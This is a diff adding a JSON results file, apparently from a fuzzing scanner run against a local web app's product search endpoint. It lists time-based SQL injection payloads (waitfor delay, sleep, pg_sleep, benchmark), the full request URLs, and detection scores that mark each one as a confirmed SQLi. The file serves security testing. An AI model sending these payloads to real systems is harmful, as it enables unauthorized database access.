@@ -1,0 +1,632 @@
+[
+  {
+    "StatusCode": 500,
+    "Word": "\u0027;waitfor delay \u00270:0:__TIME__\u0027--",
+    "Url": "http://localhost:3000/rest/products/search?q=%27%3Bwaitfor delay %270%3A0%3A__TIME__%27--",
+    "ContentLength": 974,
+    "WordCount": 114,
+    "LineCount": 50,
+    "DurationMs": 192,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,147%: baseline=30, actual=974"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0027) or sleep(__TIME__)=\u0027",
+    "Url": "http://localhost:3000/rest/products/search?q=%27%29 or sleep%28__TIME__%29%3D%27",
+    "ContentLength": 974,
+    "WordCount": 114,
+    "LineCount": 50,
+    "DurationMs": 192,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,147%: baseline=30, actual=974"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0022));waitfor delay \u00270:0:__TIME__\u0027--",
+    "Url": "http://localhost:3000/rest/products/search?q=\u0022%29%29%3Bwaitfor delay %270%3A0%3A__TIME__%27--",
+    "ContentLength": 974,
+    "WordCount": 114,
+    "LineCount": 50,
+    "DurationMs": 192,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,147%: baseline=30, actual=974"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "));waitfor delay \u00270:0:__TIME__\u0027--",
+    "Url": "http://localhost:3000/rest/products/search?q=%29%29%3Bwaitfor delay %270%3A0%3A__TIME__%27--",
+    "ContentLength": 974,
+    "WordCount": 114,
+    "LineCount": 50,
+    "DurationMs": 192,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,147%: baseline=30, actual=974"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": ");waitfor delay \u00270:0:__TIME__\u0027--",
+    "Url": "http://localhost:3000/rest/products/search?q=%29%3Bwaitfor delay %270%3A0%3A__TIME__%27--",
+    "ContentLength": 974,
+    "WordCount": 114,
+    "LineCount": 50,
+    "DurationMs": 192,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,147%: baseline=30, actual=974"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0027 or sleep(__TIME__)#",
+    "Url": "http://localhost:3000/rest/products/search?q=%27 or sleep%28__TIME__%29%23",
+    "ContentLength": 976,
+    "WordCount": 112,
+    "LineCount": 50,
+    "DurationMs": 193,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,153%: baseline=30, actual=976"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0027);waitfor delay \u00270:0:__TIME__\u0027--",
+    "Url": "http://localhost:3000/rest/products/search?q=%27%29%3Bwaitfor delay %270%3A0%3A__TIME__%27--",
+    "ContentLength": 974,
+    "WordCount": 114,
+    "LineCount": 50,
+    "DurationMs": 192,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,147%: baseline=30, actual=974"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0027) or benchmark(10000000,MD5(1))#",
+    "Url": "http://localhost:3000/rest/products/search?q=%27%29 or benchmark%2810000000%2CMD5%281%29%29%23",
+    "ContentLength": 976,
+    "WordCount": 112,
+    "LineCount": 50,
+    "DurationMs": 298,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,153%: baseline=30, actual=976"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0027)) or benchmark(10000000,MD5(1))#",
+    "Url": "http://localhost:3000/rest/products/search?q=%27%29%29 or benchmark%2810000000%2CMD5%281%29%29%23",
+    "ContentLength": 976,
+    "WordCount": 112,
+    "LineCount": 50,
+    "DurationMs": 299,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,153%: baseline=30, actual=976"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0027 or benchmark(10000000,MD5(1))#",
+    "Url": "http://localhost:3000/rest/products/search?q=%27 or benchmark%2810000000%2CMD5%281%29%29%23",
+    "ContentLength": 976,
+    "WordCount": 112,
+    "LineCount": 50,
+    "DurationMs": 299,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,153%: baseline=30, actual=976"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0022;waitfor delay \u00270:0:__TIME__\u0027--",
+    "Url": "http://localhost:3000/rest/products/search?q=\u0022%3Bwaitfor delay %270%3A0%3A__TIME__%27--",
+    "ContentLength": 974,
+    "WordCount": 114,
+    "LineCount": 50,
+    "DurationMs": 299,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,147%: baseline=30, actual=974"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0027) or pg_sleep(__TIME__)--",
+    "Url": "http://localhost:3000/rest/products/search?q=%27%29 or pg_sleep%28__TIME__%29--",
+    "ContentLength": 942,
+    "WordCount": 110,
+    "LineCount": 50,
+    "DurationMs": 299,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,040%: baseline=30, actual=942"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0022);waitfor delay \u00270:0:__TIME__\u0027--",
+    "Url": "http://localhost:3000/rest/products/search?q=\u0022%29%3Bwaitfor delay %270%3A0%3A__TIME__%27--",
+    "ContentLength": 974,
+    "WordCount": 114,
+    "LineCount": 50,
+    "DurationMs": 300,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,147%: baseline=30, actual=974"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0027)) or sleep(__TIME__)=\u0027",
+    "Url": "http://localhost:3000/rest/products/search?q=%27%29%29 or sleep%28__TIME__%29%3D%27",
+    "ContentLength": 974,
+    "WordCount": 114,
+    "LineCount": 50,
+    "DurationMs": 300,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,147%: baseline=30, actual=974"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0027 or sleep(__TIME__)=\u0027",
+    "Url": "http://localhost:3000/rest/products/search?q=%27 or sleep%28__TIME__%29%3D%27",
+    "ContentLength": 958,
+    "WordCount": 114,
+    "LineCount": 50,
+    "DurationMs": 300,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,093%: baseline=30, actual=958"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": ";waitfor delay \u00270:0:__TIME__\u0027--",
+    "Url": "http://localhost:3000/rest/products/search?q=%3Bwaitfor delay %270%3A0%3A__TIME__%27--",
+    "ContentLength": 974,
+    "WordCount": 114,
+    "LineCount": 50,
+    "DurationMs": 300,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,147%: baseline=30, actual=974"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0027 or pg_sleep(__TIME__)--",
+    "Url": "http://localhost:3000/rest/products/search?q=%27 or pg_sleep%28__TIME__%29--",
+    "ContentLength": 942,
+    "WordCount": 110,
+    "LineCount": 50,
+    "DurationMs": 388,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,040%: baseline=30, actual=942"
+        }
+      ]
+    }
+  },
+  {
+    "StatusCode": 500,
+    "Word": "\u0027)) or pg_sleep(__TIME__)--",
+    "Url": "http://localhost:3000/rest/products/search?q=%27%29%29 or pg_sleep%28__TIME__%29--",
+    "ContentLength": 958,
+    "WordCount": 114,
+    "LineCount": 50,
+    "DurationMs": 246,
+    "Detection": {
+      "Score": 80,
+      "Severity": "Confirmed",
+      "VulnType": "SQLi",
+      "Summary": "\uD83D\uDD34 CONFIRMED 80% \u2014 SQLi (3 signals)",
+      "Signals": [
+        {
+          "Name": "ErrorKeyword_SQLi",
+          "Weight": 40,
+          "VulnType": "SQLi",
+          "Evidence": "Found \u0027SQLITE_ERROR\u0027 in response body"
+        },
+        {
+          "Name": "ServerError_5xx",
+          "Weight": 25,
+          "VulnType": "ServerError",
+          "Evidence": "Status changed: baseline=200 \u2192 actual=500"
+        },
+        {
+          "Name": "SizeDeviation",
+          "Weight": 15,
+          "VulnType": "None",
+          "Evidence": "Size deviation 3,093%: baseline=30, actual=958"
+        }
+      ]
+    }
+  }
+]
